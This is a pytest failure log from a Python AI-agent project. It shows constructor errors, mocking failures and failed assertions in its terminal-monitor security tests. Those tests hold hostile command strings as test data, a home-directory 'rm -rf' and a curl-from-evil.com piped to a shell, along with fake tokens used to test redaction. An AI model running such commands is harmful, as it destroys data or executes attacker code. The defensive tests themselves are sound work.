           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: GitMetricsCollector.__init__() takes 2 positional arguments but 3 were given
_ ERROR at setup of TestGitMetricsCollector.test_get_metrics_with_specific_contributor _
tests\tier3\metrics\test_git_metrics.py:61: in git_collector
    return GitMetricsCollector(temp_repo, context_store)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: GitMetricsCollector.__init__() takes 2 positional arguments but 3 were given
_ ERROR at setup of TestContextIntelligenceIntegration.test_full_system_initialization _
tests\tier3\test_context_intelligence_integration.py:56: in context_intelligence
    return ContextIntelligence(temp_repo, temp_db)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: ContextIntelligence.__init__() takes from 1 to 2 positional arguments but 3 were given
_ ERROR at setup of TestContextIntelligenceIntegration.test_end_to_end_git_metrics_workflow _
tests\tier3\test_context_intelligence_integration.py:56: in context_intelligence
    return ContextIntelligence(temp_repo, temp_db)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: ContextIntelligence.__init__() takes from 1 to 2 positional arguments but 3 were given
_ ERROR at setup of TestContextIntelligenceIntegration.test_end_to_end_file_hotspots_workflow _
tests\tier3\test_context_intelligence_integration.py:56: in context_intelligence
    return ContextIntelligence(temp_repo, temp_db)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: ContextIntelligence.__init__() takes from 1 to 2 positional arguments but 3 were given
_ ERROR at setup of TestContextIntelligenceIntegration.test_end_to_end_insights_workflow _
tests\tier3\test_context_intelligence_integration.py:56: in context_intelligence
    return ContextIntelligence(temp_repo, temp_db)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: ContextIntelligence.__init__() takes from 1 to 2 positional arguments but 3 were given
_ ERROR at setup of TestContextIntelligenceIntegration.test_refresh_all_functionality _
tests\tier3\test_context_intelligence_integration.py:56: in context_intelligence
    return ContextIntelligence(temp_repo, temp_db)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: ContextIntelligence.__init__() takes from 1 to 2 positional arguments but 3 were given
_ ERROR at setup of TestContextIntelligenceIntegration.test_get_summary_functionality _
tests\tier3\test_context_intelligence_integration.py:56: in context_intelligence
    return ContextIntelligence(temp_repo, temp_db)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: ContextIntelligence.__init__() takes from 1 to 2 positional arguments but 3 were given
_ ERROR at setup of TestContextIntelligenceIntegration.test_database_operations _
tests\tier3\test_context_intelligence_integration.py:56: in context_intelligence
    return ContextIntelligence(temp_repo, temp_db)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: ContextIntelligence.__init__() takes from 1 to 2 positional arguments but 3 were given
_ ERROR at setup of TestContextIntelligenceIntegration.test_multi_day_analysis_consistency _
tests\tier3\test_context_intelligence_integration.py:56: in context_intelligence
    return ContextIntelligence(temp_repo, temp_db)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: ContextIntelligence.__init__() takes from 1 to 2 positional arguments but 3 were given
================================== FAILURES ===================================
___________________ TestBaseAgent.test_agent_initialization ___________________
tests\agents\test_agent_framework.py:117: in test_agent_initialization
    from CORTEX.tests.conftest import MockAgent
E   ModuleNotFoundError: No module named 'CORTEX'
_________________ TestDebouncer.test_writes_to_tier1_on_flush _________________
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1423: in patched
    with self.decoration_helper(patched,
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\contextlib.py:141: in __enter__
    return next(self.gen)
           ^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1405: in decoration_helper
    arg = exit_stack.enter_context(patching)
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\contextlib.py:530: in enter_context
    result = _enter(cm)
             ^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1497: in __enter__
    original, local = self.get_original()
                      ^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1467: in get_original
    raise AttributeError(
E   AttributeError: <module 'auto_capture_daemon' from 'D:\\PROJECTS\\CORTEX\\scripts\\cortex\\auto_capture_daemon.py'> does not have the attribute 'WorkingMemory'
_____________ TestAmbientCaptureDaemon.test_captures_file_changes _____________
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1423: in patched
    with self.decoration_helper(patched,
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\contextlib.py:141: in __enter__
    return next(self.gen)
           ^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1405: in decoration_helper
    arg = exit_stack.enter_context(patching)
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\contextlib.py:530: in enter_context
    result = _enter(cm)
             ^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1497: in __enter__
    original, local = self.get_original()
                      ^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1467: in get_original
    raise AttributeError(
E   AttributeError: <module 'auto_capture_daemon' from 'D:\\PROJECTS\\CORTEX\\scripts\\cortex\\auto_capture_daemon.py'> does not have the attribute 'WorkingMemory'
_________ TestEndToEndCapture.test_full_development_workflow_capture __________
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1423: in patched
    with self.decoration_helper(patched,
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\contextlib.py:141: in __enter__
    return next(self.gen)
           ^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1405: in decoration_helper
    arg = exit_stack.enter_context(patching)
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\contextlib.py:530: in enter_context
    result = _enter(cm)
             ^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1497: in __enter__
    original, local = self.get_original()
                      ^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1467: in get_original
    raise AttributeError(
E   AttributeError: <module 'auto_capture_daemon' from 'D:\\PROJECTS\\CORTEX\\scripts\\cortex\\auto_capture_daemon.py'> does not have the attribute 'WorkingMemory'
______________ TestTerminalMonitor.test_identifies_git_commands _______________
tests\ambient\test_terminal_monitor.py:60: in test_identifies_git_commands
    assert monitor._identify_command_type("git commit -m 'test'") == "git_commit"
E   AssertionError: assert 'test_execution' == 'git_commit'
E     
E     - git_commit
E     + test_execution
______________ TestTerminalMonitor.test_sanitizes_github_tokens _______________
tests\ambient\test_terminal_monitor.py:95: in test_sanitizes_github_tokens
    assert "[REDACTED]" in sanitized
E   AssertionError: assert '[REDACTED]' in 'git push https://ghp_abc123xyz456789012345678901234567@github.com/repo.git'
_________________ TestTerminalMonitor.test_sanitizes_api_keys _________________
tests\ambient\test_terminal_monitor.py:110: in test_sanitizes_api_keys
    assert "[REDACTED]" in sanitized
E   AssertionError: assert '[REDACTED]' in 'aws configure set secret_key mysecret123'
____________ TestTerminalMonitor.test_blocks_malicious_rm_commands ____________
tests\ambient\test_terminal_monitor.py:123: in test_blocks_malicious_rm_commands
    assert monitor._is_malicious_command(cmd)
E   AssertionError: assert False
E    +  where False = _is_malicious_command('rm -rf ~/*')
E    +    where _is_malicious_command = <auto_capture_daemon.TerminalMonitor object at 0x000001E24ED620B0>._is_malicious_command
________________ TestTerminalMonitor.test_blocks_pipe_to_shell ________________
tests\ambient\test_terminal_monitor.py:143: in test_blocks_pipe_to_shell
    assert monitor._is_malicious_command("curl https://evil.com/script | sh")
E   AssertionError: assert False
E    +  where False = _is_malicious_command('curl https://evil.com/script | sh')
E    +    where _is_malicious_command = <auto_capture_daemon.TerminalMonitor object at 0x000001E24E749A90>._is_malicious_command
__________________ TestMalformedData.test_truncated_database __________________
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\shutil.py:625: in _rmtree_unsafe
    os.unlink(fullname)
E   PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmpp0xgkkh4\\corrupted.db'

During handling of the above exception, another exception occurred:
tests\edge_cases\test_malformed_data.py:88: in test_truncated_database
    with tempfile.TemporaryDirectory() as tmpdir:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\tempfile.py:951: in __exit__
    self.cleanup()
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\tempfile.py:955: in cleanup
    self._rmtree(self.name, ignore_errors=self._ignore_cleanup_errors)
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\tempfile.py:935: in _rmtree
    _shutil.rmtree(name, onexc=onexc)
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\shutil.py:790: in rmtree
    return _rmtree_unsafe(path, onexc)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\shutil.py:629: in _rmtree_unsafe
    onexc(os.unlink, fullname, err)
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\tempfile.py:910: in onexc
    _os.unlink(path)
E   PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmpp0xgkkh4\\corrupted.db'
_______ TestCorpusCallosumCoordination.test_tactical_strategic_handoff ________
tests\integration\test_agent_coordination.py:153: in test_tactical_strategic_handoff
    architect = Architect(brain_root=str(mock_brain_root))
                ^^^^^^^^^
E   NameError: name 'Architect' is not defined
_____ TestCorpusCallosumCoordination.test_pattern_learning_feedback_loop ______
tests\integration\test_agent_coordination.py:181: in test_pattern_learning_feedback_loop
    learner = Learner(brain_root=str(mock_brain_root))
              ^^^^^^^
E   NameError: name 'Learner' is not defined
___ TestLeftBrainAgentCoordination.test_executor_tester_validator_pipeline ____
tests\integration\test_agent_coordination.py:219: in test_executor_tester_validator_pipeline
    executor = Executor(brain_root=str(mock_brain_root))
               ^^^^^^^^
E   NameError: name 'Executor' is not defined
_ TestRightBrainAgentCoordination.test_architect_pattern_matcher_integration __
tests\integration\test_agent_coordination.py:254: in test_architect_pattern_matcher_integration
    pattern_matcher = PatternMatcher(brain_root=str(mock_brain_root))
                      ^^^^^^^^^^^^^^
E   NameError: name 'PatternMatcher' is not defined
_____ TestAgentErrorHandling.test_executor_failure_doesnt_crash_pipeline ______
tests\integration\test_agent_coordination.py:279: in test_executor_failure_doesnt_crash_pipeline
    executor = Executor(brain_root=str(mock_brain_root))
               ^^^^^^^^
E   NameError: name 'Executor' is not defined
________ TestAgentErrorHandling.test_invalid_intent_handled_gracefully ________
tests\integration\test_agent_coordination.py:299: in test_invalid_intent_handled_gracefully
    router = IntentRouter(brain_root=str(mock_brain_root))
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: IntentRouter.__init__() got an unexpected keyword argument 'brain_root'
______ TestAgentMemorySharing.test_agents_access_shared_knowledge_graph _______
tests\integration\test_agent_coordination.py:340: in test_agents_access_shared_knowledge_graph
    learner = Learner(brain_root=str(shared_brain_root))
              ^^^^^^^
E   NameError: name 'Learner' is not defined
____ TestAgentMemorySharing.test_agents_access_shared_conversation_history ____
tests\integration\test_agent_coordination.py:352: in test_agents_access_shared_conversation_history
    router = IntentRouter(brain_root=str(shared_brain_root))
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: IntentRouter.__init__() got an unexpected keyword argument 'brain_root'
______ TestConcurrentAgentExecution.test_parallel_independent_operations ______
tests\integration\test_agent_coordination.py:378: in test_parallel_independent_operations
    router1 = IntentRouter(brain_root=str(mock_brain_root))
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: IntentRouter.__init__() got an unexpected keyword argument 'brain_root'
_______ TestFailureHandling.test_operation_failure_returns_error_report _______
tests\integration\test_error_recovery.py:151: in test_operation_failure_returns_error_report
    with patch('src.operations.operation_factory.OperationFactory.get_operation_definition') as mock_def:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1497: in __enter__
    original, local = self.get_original()
                      ^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1467: in get_original
    raise AttributeError(
E   AttributeError: <class 'src.operations.operation_factory.OperationFactory'> does not have the attribute 'get_operation_definition'
_______ TestErrorRecoveryStrategies.test_retry_with_exponential_backoff _______
tests\integration\test_error_recovery.py:364: in test_retry_with_exponential_backoff
    result = failing_operation()  # This simulates eventual success
             ^^^^^^^^^^^^^^^^^^^
tests\integration\test_error_recovery.py:359: in failing_operation
    raise Exception("Transient failure")
E   Exception: Transient failure
____________ TestErrorRecoveryStrategies.test_graceful_degradation ____________
tests\integration\test_error_recovery.py:372: in test_graceful_degradation
    with patch('src.tier1.vision_api.VisionAPI.analyze_screenshot') as mock_vision:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1497: in __enter__
    original, local = self.get_original()
                      ^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1467: in get_original
    raise AttributeError(
E   AttributeError: <class 'src.tier1.vision_api.VisionAPI'> does not have the attribute 'analyze_screenshot'
_____ TestOperationChainFailures.test_required_module_failure_stops_chain _____
tests\integration\test_error_recovery.py:408: in test_required_module_failure_stops_chain
    with patch('src.operations.operations_orchestrator.OperationsOrchestrator.execute') as mock_exec:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1497: in __enter__
    original, local = self.get_original()
                      ^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1467: in get_original
    raise AttributeError(
E   AttributeError: <class 'src.operations.operations_orchestrator.OperationsOrchestrator'> does not have the attribute 'execute'
___ TestOperationChainFailures.test_optional_module_failure_continues_chain ___
tests\integration\test_error_recovery.py:425: in test_optional_module_failure_continues_chain
    with patch('src.operations.operations_orchestrator.OperationsOrchestrator.execute') as mock_exec:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1497: in __enter__
    original, local = self.get_original()
                      ^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1467: in get_original
    raise AttributeError(
E   AttributeError: <class 'src.operations.operations_orchestrator.OperationsOrchestrator'> does not have the attribute 'execute'
_____________________ test_refactor_code_quality_workflow _____________________
tests\integration\test_phase_5_1_medium_priority.py:122: in test_refactor_code_quality_workflow
    assert 'refactor' in analysis_response.lower() or 'architect' in analysis_response.lower()
E   assert ('refactor' in "\u2713 **success**\n\nanalyzed authentication module structure\n\n**current_structure: {'issues': ['tight coupling', 'missing abstraction**\n\n_say 'show details' for more info_" or 'architect' in "\u2713 **success**\n\nanalyzed authentication module structure\n\n**current_structure: {'issues': ['tight coupling', 'missing abstraction**\n\n_say 'show details' for more info_")
E    +  where "\u2713 **success**\n\nanalyzed authentication module structure\n\n**current_structure: {'issues': ['tight coupling', 'missing abstraction**\n\n_say 'show details' for more info_" = <built-in method lower of str object at 0x000001E24E84FD20>()
E    +    where <built-in method lower of str object at 0x000001E24E84FD20> = "\u2713 **SUCCESS**\n\nAnalyzed authentication module structure\n\n**current_structure: {'issues': ['Tight coupling', 'Missing abstraction**\n\n_Say 'show details' for more info_".lower
E    +  and   "\u2713 **success**\n\nanalyzed authentication module structure\n\n**current_structure: {'issues': ['tight coupling', 'missing abstraction**\n\n_say 'show details' for more info_" = <built-in method lower of str object at 0x000001E24E84FD20>()
E    +    where <built-in method lower of str object at 0x000001E24E84FD20> = "\u2713 **SUCCESS**\n\nAnalyzed authentication module structure\n\n**current_structure: {'issues': ['Tight coupling', 'Missing abstraction**\n\n_Say 'show details' for more info_".lower
---------------------------- Captured stderr setup ----------------------------
2025-11-11 12:42:11,821 - cortex.entry_point - INFO - CORTEX entry point initialized
----------------------------- Captured log setup ------------------------------
INFO     cortex.entry_point:cortex_entry.py:108 CORTEX entry point initialized
---------------------------- Captured stderr call -----------------------------
2025-11-11 12:42:11,856 - cortex.entry_point - INFO - Processing request: intent=refactor, conv_id=conv-20251111-124211-8710\n2025-11-11 12:42:11,865 - cortex.entry_point - WARNING - \n============================================================\n\u26a0\ufe0f  CHECKLIST UPDATE REQUIRED \u26a0\ufe0f\n\nImplementation work completed: Refactor authentication module...\n\nPlease update: C:\\WINDOWS\\TEMP\\cortex-brain\\cortex-2.0-design\\IMPLEMENTATION-STATUS-CHECKLIST.md\n\nUpdate triggers:\n  \u2705 Mark completed tasks\n  \U0001f4ca Update metrics (tests, performance)\n  \U0001f4dd Document any blockers\n  \U0001f504 Update phase progress bars\n\nThis keeps the implementation tracking accurate!\n============================================================\n2025-11-11 12:42:11,866 - cortex.entry_point - INFO - Request completed: success=True, duration=0.0ms
------------------------------ Captured log call ------------------------------
INFO     cortex.entry_point:cortex_entry.py:152 Processing request: intent=refactor, conv_id=conv-20251111-124211-8710\nWARNING  cortex.entry_point:cortex_entry.py:453 \n============================================================\n\u26a0\ufe0f  CHECKLIST UPDATE REQUIRED \u26a0\ufe0f\n\nImplementation work completed: Refactor authentication module...\n\nPlease update: C:\\WINDOWS\\TEMP\\cortex-brain\\cortex-2.0-design\\IMPLEMENTATION-STATUS-CHECKLIST.md\n\nUpdate triggers:\n  \u2705 Mark completed tasks\n  \U0001f4ca Update metrics (tests, performance)\n  \U0001f4dd Document any blockers\n  \U0001f504 Update phase progress bars\n\nThis keeps the implementation tracking accurate!\n============================================================\nINFO     cortex.entry_point:cortex_entry.py:191 Request completed: success=True, duration=0.0ms
_________________ TestCleanupOrchestrator.test_initialization _________________
tests\operations\test_cleanup_orchestrator.py:63: in test_initialization
    assert orchestrator.metadata['name'] == 'Cleanup Orchestrator'
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: 'OperationModuleMetadata' object is not subscriptable
____________________ TestCleanupOrchestrator.test_metadata ____________________
tests\operations\test_cleanup_orchestrator.py:70: in test_metadata
    assert 'name' in metadata
           ^^^^^^^^^^^^^^^^^^
E   TypeError: argument of type 'OperationModuleMetadata' is not iterable
______________ TestFileReorganization.test_script_reorganization ______________
tests\operations\test_cleanup_orchestrator.py:205: in test_script_reorganization
    assert orchestrator.metrics.files_reorganized >= 1
E   assert 0 >= 1
E    +  where 0 = CleanupMetrics(timestamp=datetime.datetime(2025, 11, 11, 12, 42, 19, 390659), backups_deleted=0, backups_archived=0, files_reorganized=0, md_files_consolidated=0, root_files_cleaned=0, bloated_files_found=0, space_freed_bytes=0, git_commits_created=0, duration_seconds=0.0, optimization_triggered=False, warnings=[], errors=[]).files_reorganized
E    +    where CleanupMetrics(timestamp=datetime.datetime(2025, 11, 11, 12, 42, 19, 390659), backups_deleted=0, backups_archived=0, files_reorganized=0, md_files_consolidated=0, root_files_cleaned=0, bloated_files_found=0, space_freed_bytes=0, git_commits_created=0, duration_seconds=0.0, optimization_triggered=False, warnings=[], errors=[]) = <CleanupOrchestrator id=cleanup_orchestrator phase=processing priority=100>.metrics
------------------------------ Captured log call ------------------------------
INFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:475 Reorganizing files...
________________ TestMDConsolidation.test_duplicate_detection _________________
tests\operations\test_cleanup_orchestrator.py:241: in test_duplicate_detection
    assert orchestrator.metrics.md_files_consolidated >= 3
E   assert 0 >= 3
E    +  where 0 = CleanupMetrics(timestamp=datetime.datetime(2025, 11, 11, 12, 42, 19, 469510), backups_deleted=0, backups_archived=0, files_reorganized=0, md_files_consolidated=0, root_files_cleaned=0, bloated_files_found=0, space_freed_bytes=0, git_commits_created=0, duration_seconds=0.0, optimization_triggered=False, warnings=[], errors=[]).md_files_consolidated
E    +    where CleanupMetrics(timestamp=datetime.datetime(2025, 11, 11, 12, 42, 19, 469510), backups_deleted=0, backups_archived=0, files_reorganized=0, md_files_consolidated=0, root_files_cleaned=0, bloated_files_found=0, space_freed_bytes=0, git_commits_created=0, duration_seconds=0.0, optimization_triggered=False, warnings=[], errors=[]) = <CleanupOrchestrator id=cleanup_orchestrator phase=processing priority=100>.metrics
------------------------------ Captured log call ------------------------------
INFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:511 Consolidating MD files...
__________________ TestMDConsolidation.test_newest_file_kept __________________
tests\operations\test_cleanup_orchestrator.py:264: in test_newest_file_kept
    assert orchestrator.metrics.md_files_consolidated >= 1
E   assert 0 >= 1
E    +  where 0 = CleanupMetrics(timestamp=datetime.datetime(2025, 11, 11, 12, 42, 19, 515132), backups_deleted=0, backups_archived=0, files_reorganized=0, md_files_consolidated=0, root_files_cleaned=0, bloated_files_found=0, space_freed_bytes=0, git_commits_created=0, duration_seconds=0.0, optimization_triggered=False, warnings=[], errors=[]).md_files_consolidated
E    +    where CleanupMetrics(timestamp=datetime.datetime(2025, 11, 11, 12, 42, 19, 515132), backups_deleted=0, backups_archived=0, files_reorganized=0, md_files_consolidated=0, root_files_cleaned=0, bloated_files_found=0, space_freed_bytes=0, git_commits_created=0, duration_seconds=0.0, optimization_triggered=False, warnings=[], errors=[]) = <CleanupOrchestrator id=cleanup_orchestrator phase=processing priority=100>.metrics
------------------------------ Captured log call ------------------------------
INFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:511 Consolidating MD files...
_____________ TestBloatDetection.test_entry_point_bloat_detection _____________
tests\operations\test_cleanup_orchestrator.py:285: in test_entry_point_bloat_detection
    assert orchestrator.metrics.bloated_files_found >= 1
E   assert 0 >= 1
E    +  where 0 = CleanupMetrics(timestamp=datetime.datetime(2025, 11, 11, 12, 42, 19, 647592), backups_deleted=0, backups_archived=0, files_reorganized=0, md_files_consolidated=0, root_files_cleaned=0, bloated_files_found=0, space_freed_bytes=0, git_commits_created=0, duration_seconds=0.0, optimization_triggered=False, warnings=[], errors=[]).bloated_files_found
E    +    where CleanupMetrics(timestamp=datetime.datetime(2025, 11, 11, 12, 42, 19, 647592), backups_deleted=0, backups_archived=0, files_reorganized=0, md_files_consolidated=0, root_files_cleaned=0, bloated_files_found=0, space_freed_bytes=0, git_commits_created=0, duration_seconds=0.0, optimization_triggered=False, warnings=[], errors=[]) = <CleanupOrchestrator id=cleanup_orchestrator phase=processing priority=100>.metrics
------------------------------ Captured log call ------------------------------
INFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:562 Detecting bloated files...
____________ TestBloatDetection.test_orchestrator_bloat_detection _____________
tests\operations\test_cleanup_orchestrator.py:302: in test_orchestrator_bloat_detection
    assert orchestrator.metrics.bloated_files_found >= 1
E   assert 0 >= 1
E    +  where 0 = CleanupMetrics(timestamp=datetime.datetime(2025, 11, 11, 12, 42, 19, 702193), backups_deleted=0, backups_archived=0, files_reorganized=0, md_files_consolidated=0, root_files_cleaned=0, bloated_files_found=0, space_freed_bytes=0, git_commits_created=0, duration_seconds=0.0, optimization_triggered=False, warnings=[], errors=[]).bloated_files_found
E    +    where CleanupMetrics(timestamp=datetime.datetime(2025, 11, 11, 12, 42, 19, 702193), backups_deleted=0, backups_archived=0, files_reorganized=0, md_files_consolidated=0, root_files_cleaned=0, bloated_files_found=0, space_freed_bytes=0, git_commits_created=0, duration_seconds=0.0, optimization_triggered=False, warnings=[], errors=[]) = <CleanupOrchestrator id=cleanup_orchestrator phase=processing priority=100>.metrics
------------------------------ Captured log call ------------------------------
INFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:562 Detecting bloated files...
____________ TestOptimizationIntegration.test_optimization_trigger ____________
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1423: in patched
    with self.decoration_helper(patched,
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\contextlib.py:141: in __enter__
    return next(self.gen)
           ^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1405: in decoration_helper
    arg = exit_stack.enter_context(patching)
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\contextlib.py:530: in enter_context
    result = _enter(cm)
             ^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1497: in __enter__
    original, local = self.get_original()
                      ^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1467: in get_original
    raise AttributeError(
E   AttributeError: <module 'src.operations.modules.cleanup.cleanup_orchestrator' from 'D:\\PROJECTS\\CORTEX\\src\\operations\\modules\\cleanup\\cleanup_orchestrator.py'> does not have the attribute 'OptimizeCortexOrchestrator'
_______ TestOptimizationIntegration.test_optimization_failure_handling ________
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1423: in patched
    with self.decoration_helper(patched,
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\contextlib.py:141: in __enter__
    return next(self.gen)
           ^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1405: in decoration_helper
    arg = exit_stack.enter_context(patching)
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\contextlib.py:530: in enter_context
    result = _enter(cm)
             ^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1497: in __enter__
    original, local = self.get_original()
                      ^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1467: in get_original
    raise AttributeError(
E   AttributeError: <module 'src.operations.modules.cleanup.cleanup_orchestrator' from 'D:\\PROJECTS\\CORTEX\\src\\operations\\modules\\cleanup\\cleanup_orchestrator.py'> does not have the attribute 'OptimizeCortexOrchestrator'
________________ TestErrorHandling.test_git_operation_failure _________________
tests\operations\test_cleanup_orchestrator.py:472: in test_git_operation_failure
    orchestrator._git_commit_cleanup()
src\operations\modules\cleanup\cleanup_orchestrator.py:625: in _git_commit_cleanup
    result = subprocess.run(
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1169: in __call__
    return self._mock_call(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1173: in _mock_call
    return self._execute_mock_call(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\unittest\mock.py:1228: in _execute_mock_call
    raise effect
E   Exception: Git error
_________________ TestDryRunMixin.test_print_copyright_header _________________
tests\operations\test_execution_mode.py:190: in test_print_copyright_header
    mixin.print_copyright_header(
src\operations\dry_run_mixin.py:116: in print_copyright_header
    templates = self._load_templates()
                ^^^^^^^^^^^^^^^^^^^^^^
src\operations\dry_run_mixin.py:68: in _load_templates
    data = yaml.safe_load(f)
           ^^^^^^^^^^^^^^^^^
.venv\Lib\site-packages\yaml\__init__.py:125: in safe_load
    return load(stream, SafeLoader)
           ^^^^^^^^^^^^^^^^^^^^^^^^
.venv\Lib\site-packages\yaml\__init__.py:79: in load
    loader = Loader(stream)
             ^^^^^^^^^^^^^^
.venv\Lib\site-packages\yaml\loader.py:34: in __init__
    Reader.__init__(self, stream)
.venv\Lib\site-packages\yaml\reader.py:85: in __init__
    self.determine_encoding()
.venv\Lib\site-packages\yaml\reader.py:124: in determine_encoding
    self.update_raw()
.venv\Lib\site-packages\yaml\reader.py:178: in update_raw
    data = self.stream.read(size)
           ^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\encodings\cp1252.py:23: in decode
    return codecs.charmap_decode(input,self.errors,decoding_table)[0]
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   UnicodeDecodeError: 'charmap' codec can't decode byte 0x81 in position 1223: character maps to <undefined>
